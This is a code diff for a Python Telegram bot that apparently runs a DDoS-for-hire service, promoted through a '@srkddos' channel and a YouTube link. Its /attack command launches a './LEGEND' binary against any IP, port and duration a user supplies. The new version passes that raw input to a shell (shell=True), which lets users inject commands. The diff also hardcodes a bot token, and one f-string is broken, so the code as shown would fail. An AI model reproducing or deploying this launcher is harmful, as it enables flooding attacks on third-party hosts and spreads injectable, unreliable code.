@@ -1,118 +1,104 @@
-import time
+#!/usr/bin/python3
+import telebot
 import random
 import subprocess
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CommandHandler, CallbackContext, MessageHandler, filters
+import time
+import threading
 
-# Configuration
-BOT_API_TOKEN = "5373842002:AAETkiRjk84SNsPHictnLDMhRO2XCFz-N_Q"  # Add your bot API token here
-ADMIN_ID = 1232047106  # Replace with your admin Telegram ID
-OWNER_NAME = "@OWNERSRK"  # Replace with the owner name
+# Telegram bot token
+bot = telebot.TeleBot('5373842002:AAETkiRjk84SNsPHictnLDMhRO2XCFz-N_Q')
 
-# Cooldown tracker
-cooldown_time = 30  # seconds
-last_attack_time = 0
-awaiting_feedback = False
+# Admin user IDs
+admin_id = ["1232047106"]
 
-# Start command
-async def start(update: Update, context: CallbackContext.DEFAULT_TYPE) -> None:
-    await update.message.reply_text(
-        f"🔥 Welcome to the Bot! 🔥\n"
-        f"🔗 YouTube: https://www.youtube.com/@zeroflexislive\n"
-        f"🔗 Telegram: https://t.me/OWNERSRK\n"
-        f"CREATE BY {OWNER_NAME}"
-    )
+# Group and channel details
+GROUP_ID = "-1002322006686"
+CHANNEL_USERNAME = "@srkddos"
 
-# Help command
-async def help_command(update: Update, context: CallbackContext.DEFAULT_TYPE) -> None:
-    await update.message.reply_text(f"Contact the owner for access: @OWNERSRK")
+# YouTube Channel Promotion
+YOUTUBE_CHANNEL_LINK = "https://youtube.com/@zeroflexislive?si=QCy1x8BNZ3R1DRxD"
 
-# Add command
-async def add(update: Update, context: CallbackContext.DEFAULT_TYPE) -> None:
-    keyboard = [[
-        InlineKeyboardButton("✅ Add", callback_data='add'),
-        InlineKeyboardButton("❌ Remove", callback_data='remove')
-    ]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text(
-        "You can add or remove access using the buttons below:",
-        reply_markup=reply_markup
-    )
+# List of Attack Messages
+attack_messages = [
+    "🚀 Firing rockets at {}!",
+    "💣 Dropping bombs on {}!",
+    "🧨 Blasting {} into pieces!",
+    "🎯 Target acquired: {}!",
+    "🔥 Launching fire attack on {}!",
+    "💥 Exploding {} with maximum force!",
+    "⚔️ Unleashing wrath on {}!",
+    "🔫 Shooting relentlessly at {}!",
+    "🪓 Hacking {} into oblivion!",
+    "😈 Bringing chaos to {}!"
+]
 
-# Generate command
-async def generate(update: Update, context: CallbackContext.DEFAULT_TYPE) -> None:
-    random_number = random.randint(1, 100)
-    await update.message.reply_text(f"🎲 Random Number Generated: {random_number}")
+# Dictionary to Store Cooldowns (user_id: cooldown_end_time)
+user_cooldowns = {}
 
-# Attack command with binary execution and feedback system
-async def attack(update: Update, context: CallbackContext.DEFAULT_TYPE) -> None:
-    global last_attack_time, awaiting_feedback
-    current_time = time.time()
-    if awaiting_feedback:
-        await update.message.reply_text("🛑 Please provide feedback image before starting a new attack!")
-        return
-
-    if current_time - last_attack_time < cooldown_time:
-        await update.message.reply_text("⏳ Please wait for the cooldown to finish (30 seconds).")
-        return
-
-    if len(context.args) != 3:
-        await update.message.reply_text("❌ Invalid format! Use: /attack [IP] [Port] [Time]")
-        return
-
-    ip = context.args[0]
-    port = context.args[1]
-    try:
-        duration = int(context.args[2])
-        if duration > 240:
-            await update.message.reply_text("❌ Maximum time is 240 seconds. Please use a lower time.")
-            return
-    except ValueError:
-        await update.message.reply_text("❌ Time must be an integer.")
-        return
-
-    last_attack_time = current_time
-    attacker = update.effective_user.username if update.effective_user.username else 'Unknown'
-
-    await update.message.reply_text(
-        f"🚀 Attack started!\n"
-        f"💥 Target: {ip}:{port}\n"
-        f"⏱️ Duration: {duration} seconds\n"
-        f"👤 By: @{attacker}\n"
-        f"📢 CREATE BY {OWNER_NAME}"
-    )
-
-    # Execute the binary file with IP, Port, and Duration
-    try:
-        process = subprocess.Popen(['./LEGEND', ip, port, str(duration)])
-        await update.message.reply_text("⚙️ Binary execution started successfully!")
-        awaiting_feedback = True
-        await update.message.reply_text("📸 Please send an image as feedback to enable the next attack!")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Error running binary file: {e}")
-
-# Handle image feedback
-async def handle_image(update: Update, context: CallbackContext.DEFAULT_TYPE) -> None:
-    global awaiting_feedback
-    if awaiting_feedback:
-        awaiting_feedback = False
-        await update.message.reply_text("✅ Feedback received! You can now start a new attack.")
+# Start Command
+@bot.message_handler(commands=['start'])
+def start(message):
+    if str(message.from_user.id) in admin_id:
+        bot.reply_to(message, "Welcome Admin! How can I assist you today?")
     else:
-        await update.message.reply_text("⚠️ No feedback needed at this time.")
+        bot.reply_to(message, "Hello! Welcome to the bot.")
 
-# Main function to set up the bot
-async def main() -> None:
-    application = ApplicationBuilder().token(BOT_API_TOKEN).build()
+# Attack Command with 30-Second Per-User Cooldown
+@bot.message_handler(commands=['attack'])
+def attack(message):
+    user_id = message.from_user.id
+    current_time = time.time()
 
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(CommandHandler("add", add))
-    application.add_handler(CommandHandler("generate", generate))
-    application.add_handler(CommandHandler("attack", attack))
-    application.add_handler(MessageHandler(filters.PHOTO, handle_image))
+    # Check if user is in cooldown
+    if user_id in user_cooldowns:
+        remaining_time = round(user_cooldowns[user_id] - current_time)
+        if remaining_time > 0:
+            bot.reply_to(message, f"⏳ Please wait {remaining_time} seconds before using /attack again!")
+            return
 
-    await application.run_polling()
+    try:
+        args = message.text.split(' ')
+        if len(args) < 4:
+            bot.reply_to(message, "Usage: /attack <target> <port> <duration (max 180 sec)>")
+            return
 
-if __name__ == '__main__':
-    import asyncio
-    asyncio.run(main())
+        target, port, duration = args[1], args[2], int(args[3])
+        
+        # Validate Duration
+        if duration > 180:
+            bot.reply_to(message, "❌ Duration too long! Maximum allowed is 180 seconds.")
+            return
+        
+        # Show Attack Details
+        attack_msg = random.choice(attack_messages).format(target)
+        bot.reply_to(message, f"{attack_msg}\n\n🎯 **Target:** {target}\n🚪 **Port:** {port}\n⏱️ **Duration:** {duration} sec")
+
+        # Execute Shell Command
+        full_command = f"./LEGEND {target} {port} {duration}"
+        subprocess.Popen(full_command, shell=True)
+        bot.reply_to(message, f"✅ Attack started: `{full_command}`", parse_mode="Markdown")
+
+        # Set Cooldown (30 seconds)
+        user_cooldowns[user_id] = current_time + 30
+
+        # Timer for Completion Message
+        def finish_attack():
+            time.sleep(duration)
+            bot.reply_to(message, f"🏁 Attack on {target}:{port} finished after {duration} seconds! 🎉")
+            
+            # YouTube Channel Promotion
+            promotion_message = (
+                f"📢 Don't forget to check out our YouTube channel for more cool stuff! 🎬\n"
+                f"👉 [Visit Now]({https://youtube.com/@zeroflexislive?si=QCy1x8BNZ3R1DRxD})"
+            )
+            bot.send_message(message.chat.id, promotion_message, parse_mode="Markdown")
+
+        # Run the Timer in a Separate Thread
+        threading.Thread(target=finish_attack).start()
+
+    except Exception as e:
+        bot.reply_to(message, f"Error: {e}")
+
+# Polling to keep the bot running
+print("Bot is running...")
+bot.infinity_polling()
